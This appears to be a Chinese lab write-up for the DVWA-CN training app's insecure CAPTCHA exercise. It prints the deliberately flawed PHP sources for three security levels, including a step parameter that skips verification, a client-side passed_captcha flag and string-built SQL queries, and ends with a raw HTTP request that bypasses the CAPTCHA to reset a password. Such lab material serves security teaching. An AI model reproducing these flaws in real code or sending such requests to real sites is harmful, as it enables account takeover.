#dvwacn之八不安全的验证码

dvwacn之不安全的验证码物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/captcha/source# ls
high.php  low.php  medium.php
```


##安全级别

- low.php

```
<?php

if( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {
    
    $hide_form = true;
    $user = $_POST['username'];
    $pass_new = $_POST['password_new'];
    $pass_conf = $_POST['password_conf'];
    $resp = recaptcha_check_answer ($_DVWA['recaptcha_private_key'],
        $_SERVER["REMOTE_ADDR"],
        $_POST["recaptcha_challenge_field"],
        $_POST["recaptcha_response_field"]);

    if (!$resp->is_valid) {
        // What happens when the CAPTCHA was entered incorrectly
        $html .= "<pre><br />验证码错误，请重新输入。</pre>";
        $hide_form = false;
        return;	
    } else {
            if (($pass_new == $pass_conf)){
            $html .= "<pre><br />验证码通过，请单击更改按钮。 <br /></pre>";
            $html .= "
            <form action=\"#\" method=\"POST\">
                <input type=\"hidden\" name=\"step\" value=\"2\" />
                <input type=\"hidden\" name=\"password_new\" value=\"" . $pass_new . "\" />
                <input type=\"hidden\" name=\"password_conf\" value=\"" . $pass_conf . "\" />
                <input type=\"submit\" name=\"Change\" value=\"确定\" />
            </form>";
            }	

            else{
                    $html .= "<pre> 两次输入的密码必须相同。 </pre>";
            $hide_form = false;
            }
    }
}

if( isset( $_POST['Change'] ) && ( $_POST['step'] == '2' ) ) 
{
     $pass_new = $_POST['password_new'];
    $pass_conf = $_POST['password_conf'];  //独自等待添加，修正原程序中的错误
    $hide_form = true;
        if ($pass_new  != $pass_conf)
        {
                $html .= "<pre><br />两次输入的密码必须相同。</pre>";
        $hide_form = false;
                return;
        }
        $pass = md5($pass_new);
        if (($pass_new == $pass_conf)){
               $pass_new = mysql_real_escape_string($pass_new);
               $pass_new = md5($pass_new);

               $insert="UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
               $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );

               $html .= "<pre> 密码已更改。 </pre>";
               mysql_close();
        }

        else{
               $html .= "<pre> 密码不匹配。 </pre>";
        }
}
?>

```

- medium.php 

```
<?php
if( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {
	
	$hide_form = true;
	$user = $_POST['username'];
	$pass_new = $_POST['password_new'];
	$pass_conf = $_POST['password_conf'];
	$resp = recaptcha_check_answer($_DVWA['recaptcha_private_key'],
		$_SERVER["REMOTE_ADDR"],
		$_POST["recaptcha_challenge_field"],
		$_POST["recaptcha_response_field"]);

	if (!$resp->is_valid) {
		// What happens when the CAPTCHA was entered incorrectly
		$html .= "<pre><br />验证码错误，请重新输入。</pre>";
		$hide_form = false;
		return;	
	} else {
        	if (($pass_new == $pass_conf)){
			$html .= "<pre><br />验证码通过，请单击更改按钮。 <br /></pre>";
			$html .= "
			<form action=\"#\" method=\"POST\">
				<input type=\"hidden\" name=\"step\" value=\"2\" />
				<input type=\"hidden\" name=\"password_new\" value=\"" . $pass_new . "\" />
				<input type=\"hidden\" name=\"password_conf\" value=\"" . $pass_conf . "\" />
				<input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
				<input type=\"submit\" name=\"Change\" value=\"更改\" />
			</form>";
	        }	

        	else{
                	$html .= "<pre> 两次输入的密码必须相同。 </pre>";
			$hide_form = false;
	        }
	}
}

if( isset( $_POST['Change'] ) && ( $_POST['step'] == '2' ) ) 
{
     $pass_new = $_POST['password_new'];
    $pass_conf = $_POST['password_conf'];  //独自等待添加，修正原程序中的错误
	$hide_form = true;
	if (!$_POST['passed_captcha'])
	{
                $html .= "<pre><br />验证码不能过，小黑客，没得玩了哦！</pre>";
		$hide_form = false;
		return;
	}
        $pass = md5($pass_new);
        if (($pass_new == $pass_conf)){
               $pass_new = mysql_real_escape_string($pass_new);
               $pass_new = md5($pass_new);

               $insert="UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
               $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );

               $html .= "<pre> 密码已更改。 </pre>";
               mysql_close();
        }

        else{
               $html .= "<pre> 密码不匹配。 </pre>";
        }
}
?>

```


- high.php

``` 
<?php
if( isset( $_POST['Change'] ) && ( $_POST['step'] == '1' ) ) {
	
	$hide_form = true;
	
     $pass_new = $_POST['password_new'];
	$pass_new = stripslashes( $pass_new );
	$pass_new = mysql_real_escape_string( $pass_new );
	$pass_new = md5( $pass_new );

        $pass_conf = $_POST['password_conf'];
        $pass_conf = stripslashes( $pass_conf );
	$pass_conf = mysql_real_escape_string( $pass_conf );
	$pass_conf = md5( $pass_conf );
	
        $resp = recaptcha_check_answer ($_DVWA['recaptcha_private_key'],
		$_SERVER["REMOTE_ADDR"],
		$_POST["recaptcha_challenge_field"],
		$_POST["recaptcha_response_field"]);

	if (!$resp->is_valid) {
		// What happens when the CAPTCHA was entered incorrectly
		$html .= "<pre><br />验证码出错，请重试。</pre>";
		$hide_form = false;
		return;	
	} else {
                // Check that the current password is correct
		$qry = "SELECT password FROM `users` WHERE user='admin' AND password='$pass_curr';";
		$result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );
                
                if (($pass_new == $pass_conf)  && ( $result && mysql_num_rows( $result ) == 1 )){
                       $insert="UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
                       $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );

                       $html .= "<pre> 密码已更改 </pre>";
                       mysql_close();
                }

                else{
                       $html .= "<pre> 密码不匹配，请重新输入。 </pre>";
                }
	}
}
?>
```

##绕过验证码，并将密码更改为：admin888

```
POST /dvwacn/vulnerabilities/captcha/ HTTP/1.1
Host: 192.168.56.80
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.80/dvwacn/vulnerabilities/captcha/
Cookie: security=low; PHPSESSID=b066ao156vs6s2qhh0kr60sha4
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

step=2&password_new=admin888&password_conf=admin888&Change=%B5%A5%BB%F7%CE%D2%B2%E2%CA%D4
```